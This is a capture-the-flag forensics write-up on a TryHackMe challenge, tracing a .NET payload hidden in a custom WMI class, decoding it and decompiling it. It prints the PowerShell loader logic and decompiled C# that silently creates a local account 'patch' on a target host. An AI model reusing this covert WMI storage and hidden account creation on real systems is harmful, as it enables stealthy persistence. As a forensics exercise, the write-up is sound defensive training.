# TryHackMe – After Hours

> Practical walkthrough of an authorised TryHackMe forensics challenge.

## Lab information

- **Event:** Hacker Holidays 2026
- **Category:** Digital forensics
- **Platform:** TryHackMe
- **Completed:** 8 August 2026


## Objective

The challenge provided an offline Windows Management Instrumentation (WMI) repository. The objective was to identify malicious data hidden inside the repository, recover the embedded payload and determine what it would do on the compromised host.

## Initial examination

The extracted challenge files contained the components of a Windows WMI repository, including `OBJECTS.DATA`:

```bash
ls challenge_attachments
```

WMI repositories store classes, instances and property values in a binary format. Because useful text may be stored both as ASCII and UTF-16LE, I created separate string extracts:

```bash
strings -a challenge_attachments/OBJECTS.DATA > strings-ascii.txt
strings -a -el challenge_attachments/OBJECTS.DATA > strings-utf16.txt
```

I initially searched for common signs of WMI persistence and PowerShell activity:

```bash
grep -iE 'EventConsumer|EventFilter|FilterToConsumerBinding|CommandLineTemplate' \
  strings-utf16.txt

grep -iE 'PowerShell|\.NET|Assembly|System\.Reflection|mscorlib' \
  strings-utf16.txt
```

The searches returned standard WMI class names and the namespace `ROOT\Microsoft\Windows\PowerShellV3`, but no malicious command or conventional `CommandLineEventConsumer`. This suggested that the repository was not using a normal WMI event subscription. Instead, the data was likely stored in a custom WMI class.

## Identifying the hidden WMI data

Further investigation pointed to the following custom class and property:

```text
ROOT\cimv2:Win32_HardwareTelemetry
ConfigData
```

The associated PowerShell loader retrieved the property value with logic equivalent to:

```powershell
([wmiclass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value
```

The loader then Base64-decoded the value, decompressed it with Deflate, loaded the result as a .NET assembly and invoked its entry point. This showed that `ConfigData` contained the real second-stage payload rather than ordinary hardware telemetry.

Searching the ASCII extraction revealed two important encoded values. One began with `JAB...`, which is characteristic of Base64-encoded PowerShell, while the other began with `7VZPbFR...` and contained the compressed second-stage payload:

```bash
grep -nE '[A-Za-z0-9+/]{500,}={0,2}' strings-ascii.txt
```

<img width="1377" height="469" alt="Long encoded values identified in the WMI repository strings" src="https://github.com/user-attachments/assets/9874a535-d856-46ed-8759-26548d2253a8" />


*The string search exposed both the encoded PowerShell loader and the much larger payload stored in the WMI repository.*

The two values served different purposes:

- `JAB...` decoded to the PowerShell loader responsible for retrieving `ConfigData`.
- `7VZPbFR...` decoded to compressed binary data containing the .NET assembly.

The surrounding lines helped separate the payload from the next legitimate WMI object:

```bash
sed -n '365855,365880p' strings-ascii.txt
```

I extracted the matching line into its own file:

```bash
sed -n '365875p' strings-ascii.txt > payload.b64
```

## Decoding and decompressing the payload

Decoding the value as Base64 did not produce readable text:

```bash
base64 -d payload.b64 > payload.deflate
file payload.deflate
```

This was expected because the decoded bytes were compressed binary data, not PowerShell source code. In CyberChef, the equivalent recipe was:

```text
From Base64
Raw Inflate
```

I decompressed the data locally while testing raw Deflate, zlib and gzip wrappers:

```bash
python3 - <<'PY'
import zlib

data = open("payload.deflate", "rb").read()

for mode, name in [(-15, "Raw Deflate"), (15, "zlib"), (31, "gzip")]:
    try:
        result = zlib.decompress(data, mode)
        open("payload.exe", "wb").write(result)
        print(f"Success: {name} -> {len(result)} bytes")
        break
    except zlib.error as error:
        print(f"{name} failed: {error}")
PY
```

The decompressed file began with the `MZ` signature and was identified as a Windows .NET executable:

```bash
file payload.exe
xxd -l 16 payload.exe
```

Output:

```text
payload.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
```

## Static .NET analysis

A normal strings search did not expose the flag:

```bash
strings -a payload.exe | grep -iE 'THM|flag'
strings -a -el payload.exe | grep -iE 'THM|flag'
```

I therefore opened the assembly in ILSpy without executing it:

```bash
chmod +x tools/artifacts/linux-x64/ILSpy
./tools/artifacts/linux-x64/ILSpy payload.exe
```

ILSpy identified the entry point as:

```text
AfterHours.Program.Main
```


<img width="756" height="580" alt="The extracted assembly loaded in ILSpy" src="https://github.com/user-attachments/assets/0a9d72d1-d2ed-436a-b0ca-583739ca8b8b" />


*ILSpy identified `AfterHours.Program.Main` as the assembly entry point.*

The decompiled code checked whether it was running on the intended host, `bytelotusdc`. If the hostname matched, it launched a hidden command that created a local Windows user named `patch`:

```csharp
if (string.Equals(Environment.MachineName, "bytelotusdc",
    StringComparison.OrdinalIgnoreCase))
{
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    processStartInfo.Arguments =
        "/c net user patch <BASE64_REDACTED> /add";
    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    processStartInfo.CreateNoWindow = true;
    Process.Start(processStartInfo);
}
```

<img width="1488" height="720" alt="ILSpy showing the hostname check and creation of the patch account" src="https://github.com/user-attachments/assets/76cb1be3-fbd5-4345-9ccc-fa759c7f8db6" />


*Static analysis revealed a hostname check followed by silent creation of the local account `patch`. The encoded password must also be redacted before publication.*

The password supplied to `net user` was another Base64-encoded value. Decoding it recovered the challenge flag:

```bash
echo '<BASE64_REDACTED>' | base64 -d
```

```text
THM{REDACTED}
```


<img width="1480" height="890" alt="The encoded account password decoded to the challenge flag" src="https://github.com/user-attachments/assets/2206b570-8ade-442e-81dd-24401cbb7f6c" />


## Findings

The malicious data was concealed in the `ConfigData` property of the custom WMI class `Win32_HardwareTelemetry`. A separate PowerShell loader retrieved this value, Base64-decoded it, decompressed it and loaded the resulting .NET assembly directly into memory.

The recovered assembly used a hostname check to restrict execution to `bytelotusdc`. On the intended machine, it silently created the local user `patch`, using the Base64-encoded challenge flag as the account password. The legitimate-looking telemetry class therefore acted as covert payload storage, while the created local account provided persistent access.

## Key takeaways

- Malicious WMI activity is not limited to event filters and consumers; custom classes can also be used as covert storage.
- Both ASCII and UTF-16LE string extraction are useful when examining Windows forensic artefacts.
- Base64 does not necessarily decode to readable text. The output may contain compressed or encrypted binary data.
- The `MZ` header and `file` output confirmed that the decompressed data was a Windows PE file.
- Static .NET decompilation exposed the payload's behaviour without the risk of executing it.

## Flag

```text
THM{REDACTED}
```

> The flag and its encoded form have been redacted while the Hacker Holidays event is active.

---

All analysis documented here was performed in an authorised TryHackMe training environment.
